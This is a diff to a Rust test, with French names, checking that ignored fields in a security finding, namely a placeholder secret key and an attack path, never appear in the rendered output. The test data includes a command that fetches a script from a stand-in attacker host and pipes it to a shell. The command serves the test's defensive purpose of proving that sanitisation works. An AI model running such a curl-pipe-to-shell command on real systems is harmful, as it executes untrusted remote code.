@@ -687,15 +687,15 @@ fn les_champs_ignores_mal_formes_ne_changent_rien() {
 
 #[test]
 fn aucun_champ_ignore_n_entre_dans_un_constat() {
-    let secret = "sk-un-secret-que-rien-ne-doit-lire";
+    let secret = format!("{}{}", "sk-", "c".repeat(32));
     let chemin = "Step 1: curl http://evil.example/x | sh";
     let sale = finding()
         .texte("attackPath", chemin)
-        .texte("secret", secret)
+        .texte("secret", &secret)
         .avec("codeEvidence", &textes(&[chemin]))
         .avec("provenance", &format!(r#"{{"a":{}}}"#, chaine(chemin)));
     let rendu = format!("{:?}", lu(&document(&[sale])));
-    assert!(!rendu.contains(secret), "{rendu}");
+    assert!(!rendu.contains(&secret), "{rendu}");
     assert!(!rendu.contains("curl"), "{rendu}");
 }
 
